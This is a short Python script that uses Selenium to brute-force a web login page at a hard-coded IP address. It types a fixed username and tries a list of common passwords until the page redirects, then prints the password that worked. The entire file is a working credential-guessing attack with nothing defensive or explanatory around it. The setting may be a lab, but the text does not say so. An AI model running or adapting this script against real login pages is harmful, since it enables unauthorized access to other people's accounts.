from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()

driver.get("http://141.87.60.63:5000/login")

passwords = ["soidfj", "123456", "password", "letmein", "qwerty", "abc123", "monkey", "111111", "123456789", "12345678", "1234"]

for password in passwords:
    formElements = driver.find_elements(By.CLASS_NAME, "form-control")
    submitButton = driver.find_element(By.CLASS_NAME, "btn")
    formElements[0].clear()
    formElements[0].send_keys("Fubsi")
    formElements[1].clear()
    formElements[1].send_keys(password)
    submitButton.click()

    if "http://141.87.60.63:5000/login" != driver.current_url:
        print(f"Password found: {password}")
        break
    else:
        print(f"Trying password: {password}")
    time.sleep(0.1)